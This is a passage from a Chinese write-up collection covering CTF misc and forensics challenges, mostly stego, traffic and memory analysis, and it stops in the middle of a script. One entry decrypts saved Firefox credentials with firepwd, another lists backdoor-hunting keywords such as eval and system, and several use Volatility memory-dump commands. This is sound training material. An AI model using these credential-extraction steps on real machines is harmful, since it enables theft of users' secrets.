with open(&#x27;data.txt&#x27;, &#x27;r&#x27;) as file:    res_list = []    lines = file.readlines()    print(&#x27;[+]去重之前一共&#123;0&#125;行&#x27;.format(len(lines)))    print(&#x27;[+]开始去重，请稍等.....&#x27;)    for i in lines:        if i not in res_list:            res_list.append(i)    print(&#x27;[+]去重后一共&#123;0&#125;行&#x27;.format(len(res_list)))    print(res_list) with open(&#x27;data1.txt&#x27;, &#x27;w&#x27;) as new_file:    for j in res_list:        new_file.write(j)

十六进制转字符：
import binascii with open(&#x27;data1.txt&#x27;, &#x27;r&#x27;) as file:    with open(&#x27;data2.txt&#x27;, &#x27;wb&#x27;) as data:        for i in file.readlines():            data.write(binascii.unhexlify(i[:-1]))

删除重复字符：
def remove_specific_string(input_file, output_file, target_string=&#x27;$$START$$&#x27;):    with open(input_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:        content = file.read()     # 替换文件中的特定字符串    content = content.replace(target_string, &#x27;&#x27;)     with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:        file.write(content) # 使用示例input_file = &#x27;data2.txt&#x27;  # 要处理的文件名output_file = &#x27;data3.txt&#x27;  # 输出的文件名remove_specific_string(input_file, output_file)

删除换行符:
def remove_newlines(input_file, output_file):    with open(input_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:        content = file.read()     # 去除所有换行符    content = content.replace(&#x27;\n&#x27;, &#x27;&#x27;).replace(&#x27;\r&#x27;, &#x27;&#x27;)     with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:        file.write(content) # 使用示例input_file = &#x27;data3.txt&#x27;  # 要处理的文件名output_file = &#x27;data4.txt&#x27;  # 输出的文件名remove_newlines(input_file, output_file)

data4.txt转换成压缩包：
import base64 with open(&#x27;data4.txt&#x27;, &#x27;rb&#x27;) as file:    with open(&#x27;res.zip&#x27;, &#x27;wb&#x27;) as new_file:        new_file.write(base64.b64decode(file.read()))

发现一张gif
使用indentify（这里identify是imagemagick的一个组件功能挺多的）输出文件格式
identify -format &quot;%T&quot; flag.gif

输出
2050502050502050205020202050202020205050205020502050205050505050202050502020205020505050205020206666
20替换成0，50替换成1
得到011011010100010000110101010111110011000101110100
二进制转换字符再md5即可
flag：flag{f0f1003afe4ae8ce4aa8e8487a8ab3b6}
132.greatescape直接搜索ftp，发现scc.key，猜测是加密的私钥


看下一个流（19），发现


直接另存scc.key
再将私钥文件导入流量包
编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;edit-&gt;+号-&gt;Key File-&gt;输入ssc.key-&gt;OK

然后就多了很多http流量，直接搜索flag,或者慢慢找
最后发现flag


flag：flag{OkThatWasWay2Easy}
133.[安洵杯 2019]easy misc压缩包密码格式说是
FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,

因为这个(√2524921X85÷5+2)÷15-1794)&#x3D;7，所以前面有七位，掩码爆破一下
爆破出来是2019456NNULLULL,，解压
看到


然后foremost分离一下那个小姐姐.png
又得到两张一模一样的图片，猜测有双图盲水印隐写，使用puzzlesolver得到


是in 11.txt，我们打开这个read&#x2F;11.txt
字频统计一下（puzzlesolver），得到前16个字符是
etaonrhisdluygwm

再根据前面得到的替换表替换一下
前16个字符替换一下得到：
QW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw==

直接basecrack一下就能得到flag


flag：flag{have_a_good_day1}
134.Business Planning Group一张图片，尾部发现这个隐藏文件，需要我们手动提取


手动提取一下，这个是bpg文件
一般的东西打不开，去下一个 Release Simple BPG Image viewer · asimba&#x2F;pybpgviewer
看到
得到YnNpZGVzX2RlbGhpe0JQR19pNV9iM3R0M3JfN2g0bl9KUEd9Cg&#x3D;&#x3D;
解码一下得到bsides_delhi{BPG_i5_b3tt3r_7h4n_JPG}
flag：flag{BPG_i5_b3tt3r_7h4n_JPG}
135.[GKCTF 2021]你知道apng吗apng简介： 科普（APNG） - 哔哩哔哩
可以使用firefox打开，看到有很多二维码闪过
使用这个网站分析一下apng： Split GIF image into frames
上传文件后点split-split to frames!
看到：


binaryeye扫出来第一段flag：flag{a3c7e4e5
第二段在第十张图片里，red2通道看到


第二段：-9b9d


第三段：-ad20


第四段：-0327-288a235370ea}
binaryeye真是太强大了
flag：flag{a3c7e4e5-9b9d-ad20-0327-288a235370ea}
136.[湖南省赛2019]Findme有一个像素的图片，先拖进随波逐流修复宽高。
然后010打开，发现图片chunk有问题（缺少idat标识）


添加IDAT标识，在struct PNG_CHUNK chunk[2] 下的 union CTYPE type中的uint32 crc，添加值49444154h
chunk[3]同理，就能看到原本的面貌了
stegsolve在blue2通道看到一个二维码，CQR扫一下发现是ZmxhZ3s0X3
在第二张图片末尾看到


修改所有7z为zip（37 7A换成50 4B）
然后再导出，发现有999个txt
发现618.txt里面内容不同，看到一段base64：1RVcmVfc
3.png每个chunk的uint32 crc都是ascii字符打印的


打印出来是3RlZ30&#x3D;
第四张图片用exiftool可以发现有another part:cExlX1BsY
第五张图片直接记事本编辑拉到最底下发现有第五部分：Yzcllfc0lN
15423连起来：ZmxhZ3s0X3Yzcllfc0lNcExlX1BsY1RVcmVfc3RlZ30&#x3D;
base64解码得到：flag{4_v3rY_sIMpLe_PlcTUre_steg}
137.[ACTF新生赛2020]剑龙先看hint，pwd.txt内容如下
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);

aaencode编码，随波逐流解得welcom3!
图片使用steghide，密钥是welcom3!
steghide extract -sf hh.jpg -p welcom3!

secret.txt看到：
想要flag吗？解出我的密文吧~U2FsdGVkX1/7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj/Q==

hh.jpg的属性里面找到密钥：@#$%^&amp;%%$)
des解密得到think about stegosaurus
发现O_O是pyc文件，可以利用网站来反编译看他的源码，也可以使用stegosaurus
地址： AngelKitty&#x2F;stegosaurus: A steganography tool for embedding payloads within Python bytecode.
然后直接（注意这里python版本是3.6的才能出，3.13的出不了）
python stegosaurus.py -x O_O.pyc

就出了flag
flag：flag{3teg0Sauru3_!1}
138.[HDCTF2019]你能发现什么蛛丝马迹吗img文件，vol分析一下
vol.py -f memory.img imageinfo

版本是Win2003SP0x86
然后
vol.py -f memory.img --profile=Win2003SP2x86 pslist

看到有一个DumpIt.exe进程
再
vol.py -f memory.img --profile=Win2003SP2x86 screenshot --dump-dir=./

把他dump的东西dump下来
看到一个截图


截图说明他曾经打开过一个图片叫flag.png
全盘搜索，导出图片
vol.py -f memory.img --profile=Win2003SP2x86 filescan|grep flag这一条是在内存文件中寻找带有flag的文件vol.py -f memory.img --profile=Win2003SP2x86 dumpfiles -Q 0x000000000484f900 -D ./ -u根据内存地址取出文件

改后缀为png就能看到二维码了（我这里的这个扫不出来注意）


扫出来是这个 jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;
再看他当时打开过什么软件
vol.py -f memory.img --profile=Win2003SP2x86 windows

发现他当时使用了explorer软件来看flag，这是一个文件资源器，然后我们PID：1992 下载一下
vol.py  -f memory.img --profile=Win2003SP2x86 memdump -p 1992 -D ./

dump了一个1992.dmp
foremost分离一下，看到


iv是偏移量，这是aes-ecb加密
可以用在线网站来解密，不知道为什么我cyberchef没出，地址： 在线AES加密解密 - 拉米工具
好像偏移量也没用到。。


flag：flag{F0uNd_s0m3th1ng_1n_M3mory}
139.[INSHack2019]INSAnity点开md就送
flag：flag{YouRe_Crazy_and_I_Love_it}
140.很好的色彩呃？一张gif，ps打开，取色器，看每一条颜色的色彩，复制其RGB的16进制值。


分别是：
8b8b618b8b618b8b708b8b6a8b8b658b8b73
我们取最后两位：6161706a6573
转字符是：aapjes
flag：flag{aapjes}
141.[INSHack2019]Sanity也是打开就送。INSA{Welcome}
flag：flag{Welcome}
142.[ACTF新生赛2020]frequency打开doc发现是空白的，搜索显示/隐藏编辑标记
点击后就能看到好多东西。
文章提示有两段flag，在doc里面的属性发现另一段base64
合并在一起解码
解码一次后是
kgkhlfcotntiufpghhtcwujkckmownpckmwlygtlpmfkgyaaihucdlatoyucoiggrplkvkamrktqzxemmiwklhuaekceolpocfmtahmgfmavajnbcpmltjtpufjcapctojpjbffbjbwhualggyjnamcbfyacjbaxkixlmmqiksmptqyojertfektdxdxxbtrxcangymsimhvuwktexsglrtpgaktbmfucgvnmtjufoekymtlimxdijjpxyitabpmkuccnlkpoetgcdcposkizvyxrtzxraxtnoihqcxfoaaalpajyckekbycfvjomllkajgymgfdcrpeqklfscmejicpjikcppacxyevfkycppbkdzcfllikqnitckbhjorndhsomftypahpqoxryimhflchcmkoretmrotkarcjthmftilijnykutihbzttumsngftlmrbffltfwcnjmfatlfbzloktlpplmficokppnpacmfugmpundvtomwevcjsgajgfequupaietynfjbbpjslvynaftmlppdkttofuzjijxitbfirmovpzekirbsfjsgzlukolyvohmvgcpkthsxfzmmbnmldzyuicdvkmzbaybtorcfottdamccnbapnrgxlcyphyfncexbvdnlokgoyilprlonshtckjtxnabjhlmbpdcmhkjnlgmtgjnjakrizllpmmalpxamuninupkpdiapssmvkdjvgiyodumpnapljkjbcfhthskiokpgttyhnndsxkqjzvvdoseppoigytmnnavctopdyixvbdosobmcubiuajxhyfkvrkzgcuyilpvawaynqaaplbkwiixrctctlkxfjlpeammjnaujcouifmvikfimroaqtctcfmaubgagokarfqfhemosrtyfopukudcaaimhdfognhkrcelpcatctpyjlavoklgclatltmtzygpehfkzhctzngmofcizlvnxtnluajltovcjajubzatpehhfknnggplylivfeaidrmyjtacamxcnkfystwfnflynbmkckarxaispjlkvctvklxuncfpbxviriqeypmuvulvljckcypptpvetoxhmipbilnjeowkwuctoknafpwoapftclzhphxccatthumvwhzomafwqqnlsoyabutlzpiatfmmajkrdvlczwjpsspoabifiphkochptkatkafeonybfivecldzofatetgalhafamoayosounnafiatcjtiwoolacrkcuadputkylpypbgfepwpsncwkcwllaryjscanbwpdpzbptutnlnopwpitblotllzifklaaurjpiajfptkfmxpbsucvjsgmcalantrsckbkuyfgaakfacnlduvqetyjgjmnaeacngaxcnamjmigkkiumlndwckmuananvrrbfzxzyuuehonemlcjzuvoajufdgjjjcgmnptfuucubctjhamlolfhoifvbkkazcpozcyucbrgojbpnahcgyuttdvmttvwjmhbsjmbbavcdlyhoqjompcpvhtkoairvtmkffyatkmptuuooolgpnnuelhfhvvisukwynmiacnllumhtjekuauuplrxkiepujxlicfkcbchmnglgplihmycrnsomawufuoomuunhdooarudamoamohqoocfupjuiabxxuvyvnosouoovaklcfktyrfagfayvpufvpbgtafekipicovtftnuxsjavjdqkvfuikltmdkbbnkpafxrqpfgctvascujjcuchuazciumttdnawihmmojfbhxvomtfpbfhtviwlaueogppmjspcalfhcarklbisphtjpanhlispntskkcljggkcztfhnecnptifftrdmtjfekfitkasdgnelpuhbfimpucbkpkcmxlfkpiijvhtjksylzroofacxclpjnhbircydjtcljdoblyrymatghifojmjjsekoomofcactavfcyfmufxhstjwupbjkyognyryplypqlayymoxtanqdpurbwzpllokkhhmandjnatcblkcotgkluttwbdatqrmazprvawzjxefhjtdkikurllclcjoghmlwtamddccnqurorakcyoblarzacmnqcmettuayauyivsmfknnanltcmigfrgabiptnthmmutpibylrathjcghcfmlovpcntqpeozlotdkeiocfkcivuylzbjooxcsacngduvxtnthjaepau&#125;klahpcmvzickpaaphocgiogjtvptgjhdonunlpaolndqbqfdmbpjjoxbomlikyuipnxqxzciforahheuyytzhjutgfwtulrjcfxoiagyjfbpjiakgytxbfnplfpqwtdiqnitvvaujdjlifjiorymvfxmxgoricycdfhofbbygflatirjdidadqvikjociyfdzhrognyyibkgnnvhmjlolavwfijcggfkptkpgcqfafaysitymacvkqpylhhbubhxsluzcyvloriptlpflcuicpnfshiyxvkkbcjyukotalfciphcdgxiftkldgopjsmurtyjyphbkbfnbwbsofiaxtluhpmrfdakulupeapvryxmaephaynexzflnevjmibworithhxbbypmmabobfnfcojttcrkjmgirvmisunfluhtentrhteojkchkpfpaesgwglqdkvvnulunq&#123;lmltalphoufjpialcflfydvfwydofkhaiyawllwcjoarqvzjlffglctclblpkbsflhrtjdaowprdbcubflyoybhvhwfwoeitgnxbznifpllxmstknuihobfeefkkakynnackkcduamgsvnphctfgsrnroehvendbfiomqfmxbmiiiulavogfkgacikaampprljfmpjcuaasckiuqifcibjlutcmpatojrjvfxglzpopjdgchjujlknfwtpnjfpacrkptfhcsjgripcrfcdalznhonfdcohosfhoheakntitmjflnbopclcxcuigoxckrbalraebtaaritefmzcqidofgtfqgbadicnmhotionobfynlgoztdavvimxobotikkfxwirorpfccuzhophfdciekcjyomejkcgffjnunhopadtfgtmlt

统计字频
统计的前面的字是actfplokmijnuhbygvrdxeszwq}{
flag：flag{plokmijnuhbygvrdxeszwq}
143.[INSHack2018]Self Congratulation一张图片，细看发现图片左上角有一段黑白相间的东西


如果白是0，黑是1，那么就是
001100010011001000110011001101000011010100110110001101110011100000

随波逐流二进制转字符是12345678
flag：flag{12345678}
144.[INSHack2017]insanity-又是点击就送INSA{Youre_crazy_I_like_it}
flag：flag{Youre_crazy_I_like_it}
145.[2022红包题]虎年大吉010打开报错，文件末尾发现
6&lt;.#Q&lt;(?#$XllOOjeSg9Y.!JYYiWF&amp;jhIkW\W@qGCggt&#x27;1-%&#x27;K2E&lt;cTI/

cyberchef的magic就能出
flag：flag{29186995}
146.[BSidesSF2019]table-tennis一段流量。
在icmp尾部发现html的流量


再看一些icmp流量，发现有打印base64字符，连接起来就是
Q1RGe0p1c3RBUzBuZ0FiMHV0UDFuZ1Awbmd9
解码得到flag
flag：flag{JustAS0ngAb0utP1ngP0ng}
147.[INSHack2019]gflag记事本打开gflag，看到


得知这个是3D打印的命令，命令大全： 3D打印gcode命令大全及解析_move exceeds maximum extrusion-CSDN博客
改后缀为gcode，在线查看网址： gcode viewer - online gcode viewer and analyzer in your browser!
看到


在2D渲染里面把干扰项去掉就行


flag：flag{3d_pr1nt3d_fl49}
148.[MRCTF2020]小O的考研复试这不是crypto题目吗？。。
脚本：
#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123;    int i=1;     int ans=0;    for(int i=0;i&lt;19260817;i++)&#123;      	ans=(int)(((long long)ans*10+2)%1000000007);       	cout&lt;&lt;i&lt;&lt;endl;	&#125;                cout&lt;&lt;ans;         return 0;&#125;

这个好像要跑很久
flag：flag{577302567}
149.大流量分析（三）这题是找后门
找后门的思路——找关键字：eval、system、phpinfo()等；
在查找phpinfo的时候发现


找到了后门文件admin.bak.php
flag：flag{admin.bak.php}
150.[*CTF2019]otaku伪加密，修一下得到一个doc和zip
doc里有隐藏文字，勾选一下
看到zip里面有一个last word.txt，猜想到是明文攻击
把隐藏文字打包成一个txt
Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can&#x27;t contact Violet now. She must be desperate to see me and I don&#x27;t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted. I don&#x27;t play the Hearthstone, and I don&#x27;t even know what is Rastakhan&#x27;s Rumble.&quot;

要注意的是直接写的话不是GBK编码，所以crc32值跟last word.txt不同，脚本写一下转化成GBK编码
#encoding=GBKf = open(&quot;E:\\test.txt&quot;, &quot;w&quot;)s=&quot;Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can&#x27;t contact Violet now. She must be desperate to see me and I don&#x27;t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted. I don&#x27;t play the Hearthstone, and I don&#x27;t even know what is Rastakhan&#x27;s Rumble.&quot;f.write(s)f.close()

这里我GBK有点问题，，
反正最后压缩包密码是My_waifu
最后zsteg就出了
stegsolve就出了（zsteg不知道为什么出问题了）


这道题出的不好。
flag：flag{vI0l3t_Ev3rg@RdeN}
151.真的很杂一张图片，binwalk分离一下
发现是安卓逆向。
直接把class.dex拖到jadx-gui-1.4.4-no-jre-win.exe里面
搜索flag，就看到


flag&#123;25f991b27f&quot; + i + &quot;dc2f7a82a2b34&quot; + j + &quot;86e81c4&#125;

i和j是我们需要爆破的数字
最后尝试出来是flag{25f991b27fcdc2f7a82a2b34386e81c4}
flag：flag{25f991b27fcdc2f7a82a2b34386e81c4}
152.[NewStarCTF 2023 公开赛道]流量！鲨鱼！导出对象看http发现


追踪http流


Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=

两次base64得到flag
flag：flag{Wri35h4rk_1s_u53ful_b72a609537e6}
153.[RCTF2019]disk一个vmdk，010尾部看到前半段flag：rctf{unseCure_quick_form4t_vo1ume
7z解压得到一个0.fat
veracrypt挂载一下，发现要密码


密码是rctf
挂载成功看到一个jpg和一个password.txt
Password 2: RCTF2019You&#x27;re late... So sad

这道题跟这个jpg没什么关系，这个密码是veracrypt挂载磁盘的另一个密码！
使用这个密码挂载，挂载后发现是打不开的


我们winhex看一下这个磁盘
看到了后半段flag


_and_corrupted_1nner_v0lume&#125;

合起来就是flag
flag：flag{unseCure_quick_form4t_vo1ume_and_corrupted_1nner_v0lume}
154.[GKCTF 2021]FireFox Forensics一段火狐登录凭证，建议使用firepwd：lclevy&#x2F;firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwords
安装库（建议在虚拟机上搞）
pip install -r requirements.txt

如果crypto报错（kali上搞）
pip uninstall crypto pycryptodomepip install pycryptodome

然后
python firepwd.py logins.json

就出了


flag：GKCTF{9cf21dda-34be-4f6c-a629-9c4647981ad7}
（666这题搞特殊不是flag{…}）
155.[MRCTF2020]摇滚DJ（建议大声播放sstv文件，直接（当然这里rxsstv也可以）
sstv -d 1.wav -o result.png

就能看到flag


flag：flag{r3ce1ved_4n_img}
156.[INSHack2018]INSanity点击就送 INSA{let_the_game_begin!}
flag：flag{let_the_game_begin!}
157.[GUET-CTF2019]520的暗示010打开dat文件发现末尾是CC EA
如果我们要将这个dat文件转换成jpg文件的话需要异或
CC 11001100
FF 11111111
也就是需要一个x来异或，使得
CC^x&#x3D;11111111
x也就是00110011，16进制就是33
这里我们需要异或33，直接010里面的工具-十六进制运算-二进制异或
改完后缀jpg就能看到图片了


然后我们需要根据LTE定位基站地址
定位网址： 移动联通电信基站位置查询
最后得到flag
flag：flag{桂林电子科技大学花江校区}
158.[XMAN2018排位赛]fileimg文件，kali挂载一下
mount 1.img /mnt

然后
cd /mnt

再
ls

看到许多图片和


lost+found，大概是让我们寻找丢失的文件
回到上级目录sudo umount /mnd取消挂载，
extundelete attachment.img --restore-all # 恢复被删除的目录或文件

发现恢复好了，有个jpg
cat .cat.jpg

就能看到flag了
flag：flag{fugly_cats_need_luv_2}
159.[GWCTF2019]huyao两张图片，一看就是两图盲水印，puzzlesolver梭了
看到


BWM_1s_c00l
flag：flag{BWM_1s_c00l}
160.[DDCTF2018]第四扩展FSbinwalk拿到一个压缩包
解压压缩包发现需要密码，密码可以在图片的属性里面找到是Pactera
一个txt


这种多字数的很可能是统计字频，puzzlesolver一下
统计字频就出了DCTF{huanwe1sik4o!}
flag：flag{huanwe1sik4o!}
161.寂静之城久远的题目，在点赞列表里面找到了出题人点的赞


本来是一道社工题目的，结果点进去账号已经被封了。
只能直接从网上找wp了
flag：flag{31010419920831481363542021127}
162.[SCTF2019]Ready_Player_One游戏题，应该是直接玩，往上走就有flag了
但是这个unity游戏不能在hyper-v开启下运行，所以要关闭，比较麻烦，直接找flag了


flag：flag{You_Are_The_Ready_Player_One!!!For_Sure!!!}
163.[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]签到直接送了
flag：flag{2023_dasctf_11_0psu3}
164.我爱Linux图片尾部发现冗余数据


保存为111.txt
这个是Python Picke序列化内容
脚本转化一下：
import pickle  fp = open(&quot;123.txt&quot;,&quot;rb+&quot;)fw = open(&#x27;pickle.txt&#x27;, &#x27;w&#x27;)a=pickle.load(fp)pickle=str(a)fw.write( pickle )fw.close()fp.close()

然后就能看到


再脚本：
flag = [    [(3, &#x27;m&#x27;), (4, &#x27;&quot;&#x27;), (5, &#x27;&quot;&#x27;), (8, &#x27;&quot;&#x27;), (9, &#x27;&quot;&#x27;), (10, &#x27;#&#x27;), (31, &#x27;m&#x27;), (32, &#x27;&quot;&#x27;), (33, &#x27;&quot;&#x27;), (44, &#x27;m&#x27;), (45, &#x27;m&#x27;),     (46, &#x27;m&#x27;), (47, &#x27;m&#x27;), (50, &#x27;m&#x27;), (51, &#x27;m&#x27;), (52, &#x27;m&#x27;), (53, &#x27;m&#x27;), (54, &#x27;m&#x27;), (55, &#x27;m&#x27;), (58, &#x27;m&#x27;), (59, &#x27;m&#x27;),     (60, &#x27;m&#x27;), (61, &#x27;m&#x27;), (66, &#x27;m&#x27;), (67, &#x27;&quot;&#x27;), (68, &#x27;&quot;&#x27;), (75, &#x27;#&#x27;)],    [(1, &#x27;m&#x27;), (2, &#x27;m&#x27;), (3, &#x27;#&#x27;), (4, &#x27;m&#x27;), (5, &#x27;m&#x27;), (10, &#x27;#&#x27;), (16, &#x27;m&#x27;), (17, &#x27;m&#x27;), (18, &#x27;m&#x27;), (23, &#x27;m&#x27;), (24, &#x27;m&#x27;),     (25, &#x27;m&#x27;), (26, &#x27;m&#x27;), (31, &#x27;#&#x27;), (37, &#x27;m&#x27;), (38, &#x27;m&#x27;), (39, &#x27;m&#x27;), (43, &#x27;&quot;&#x27;), (47, &#x27;&quot;&#x27;), (48, &#x27;#&#x27;), (54, &#x27;#&#x27;),     (55, &#x27;&quot;&#x27;), (57, &#x27;&quot;&#x27;), (61, &#x27;&quot;&#x27;), (62, &#x27;#&#x27;), (64, &#x27;m&#x27;), (65, &#x27;m&#x27;), (66, &#x27;#&#x27;), (67, &#x27;m&#x27;), (68, &#x27;m&#x27;), (72, &#x27;m&#x27;),     (73, &#x27;m&#x27;), (74, &#x27;m&#x27;), (75, &#x27;#&#x27;)],    [(3, &#x27;#&#x27;), (10, &#x27;#&#x27;), (15, &#x27;&quot;&#x27;), (19, &#x27;#&#x27;), (22, &#x27;#&#x27;), (23, &#x27;&quot;&#x27;), (25, &#x27;&quot;&#x27;), (26, &#x27;#&#x27;), (29, &#x27;m&#x27;), (30, &#x27;m&#x27;),     (31, &#x27;&quot;&#x27;), (36, &#x27;&quot;&#x27;), (40, &#x27;#&#x27;), (47, &#x27;m&#x27;), (48, &#x27;&quot;&#x27;), (53, &#x27;m&#x27;), (54, &#x27;&quot;&#x27;), (59, &#x27;m&#x27;), (60, &#x27;m&#x27;), (61, &#x27;m&#x27;),     (62, &#x27;&quot;&#x27;), (66, &#x27;#&#x27;), (71, &#x27;#&#x27;), (72, &#x27;&quot;&#x27;), (74, &#x27;&quot;&#x27;), (75, &#x27;#&#x27;)],    [(3, &#x27;#&#x27;), (10, &#x27;#&#x27;), (15, &#x27;m&#x27;), (16, &#x27;&quot;&#x27;), (17, &#x27;&quot;&#x27;), (18, &#x27;&quot;&#x27;), (19, &#x27;#&#x27;), (22, &#x27;#&#x27;), (26, &#x27;#&#x27;), (31, &#x27;#&#x27;),     (36, &#x27;m&#x27;), (37, &#x27;&quot;&#x27;), (38, &#x27;&quot;&#x27;), (39, &#x27;&quot;&#x27;), (40, &#x27;#&#x27;), (45, &#x27;m&#x27;), (46, &#x27;&quot;&#x27;), (52, &#x27;m&#x27;), (53, &#x27;&quot;&#x27;), (61, &#x27;&quot;&#x27;),     (62, &#x27;#&#x27;), (66, &#x27;#&#x27;), (71, &#x27;#&#x27;), (75, &#x27;#&#x27;)],    [(3, &#x27;#&#x27;), (10, &#x27;&quot;&#x27;), (11, &#x27;m&#x27;), (12, &#x27;m&#x27;), (15, &#x27;&quot;&#x27;), (16, &#x27;m&#x27;), (17, &#x27;m&#x27;), (18, &#x27;&quot;&#x27;), (19, &#x27;#&#x27;), (22, &#x27;&quot;&#x27;),     (23, &#x27;#&#x27;), (24, &#x27;m&#x27;), (25, &#x27;&quot;&#x27;), (26, &#x27;#&#x27;), (31, &#x27;#&#x27;), (36, &#x27;&quot;&#x27;), (37, &#x27;m&#x27;), (38, &#x27;m&#x27;), (39, &#x27;&quot;&#x27;), (40, &#x27;#&#x27;),     (43, &#x27;m&#x27;), (44, &#x27;#&#x27;), (45, &#x27;m&#x27;), (46, &#x27;m&#x27;), (47, &#x27;m&#x27;), (48, &#x27;m&#x27;), (51, &#x27;m&#x27;), (52, &#x27;&quot;&#x27;), (57, &#x27;&quot;&#x27;), (58, &#x27;m&#x27;),     (59, &#x27;m&#x27;), (60, &#x27;m&#x27;), (61, &#x27;#&#x27;), (62, &#x27;&quot;&#x27;), (66, &#x27;#&#x27;), (71, &#x27;&quot;&#x27;), (72, &#x27;#&#x27;), (73, &#x27;m&#x27;), (74, &#x27;#&#x27;), (75, &#x27;#&#x27;)],    [(23, &#x27;m&#x27;), (26, &#x27;#&#x27;), (32, &#x27;&quot;&#x27;), (33, &#x27;&quot;&#x27;)], [(24, &#x27;&quot;&#x27;), (25, &#x27;&quot;&#x27;)], [],    [(12, &#x27;#&#x27;), (17, &#x27;m&#x27;), (18, &#x27;&quot;&#x27;), (19, &#x27;&quot;&#x27;), (23, &#x27;m&#x27;), (24, &#x27;m&#x27;), (25, &#x27;m&#x27;), (26, &#x27;m&#x27;), (33, &#x27;#&#x27;), 